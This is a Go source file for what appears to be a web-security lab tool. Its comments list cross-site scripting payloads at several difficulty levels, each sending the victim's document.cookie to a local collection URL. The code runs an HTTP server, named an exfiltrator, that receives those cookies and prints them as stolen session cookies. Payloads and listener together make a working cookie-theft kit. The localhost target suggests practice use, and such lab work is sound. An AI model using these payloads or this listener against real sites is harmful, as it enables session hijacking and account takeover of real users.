package xss

import (
	"fmt"
	"net/http"
)

// DOM-based XSS
// LOW: <script>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</script>
// MEDIUM: <body onload='window.location.replace("http://localhost:8000/xss?cookie=" + document.cookie)'>
// HIGH: #<script>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</script>

// Reflected & Storage XSS
// LOW: <script>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</script>
// MEDIUM: <SCRIPT>var req = new XMLHttpRequest(); req.open("GET", "http://localhost:8000/xss?cookie=" + document.cookie, false); req.send();</SCRIPT>
// HIGH: <body onload='window.location.replace("http://localhost:8000/xss?cookie=" + document.cookie)'>

func Run(port int) error {
	exfiltrator := NewXSSExfiltrator()
	return exfiltrator.StartServer(port)
}

type XSSExfiltrator struct {
}

func NewXSSExfiltrator() *XSSExfiltrator {
	return &XSSExfiltrator{}
}

func (r *XSSExfiltrator) StartServer(port int) error {
	http.HandleFunc("/xss", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")

		cookie := r.URL.Query().Get("cookie")
		if cookie == "" {
			fmt.Println("exfiltrated query does not contain cookie")
		} else {
			fmt.Printf("Stolen cookie of logged in user: %s\n", cookie)
		}

		w.WriteHeader(http.StatusNoContent)
	})

	return http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}
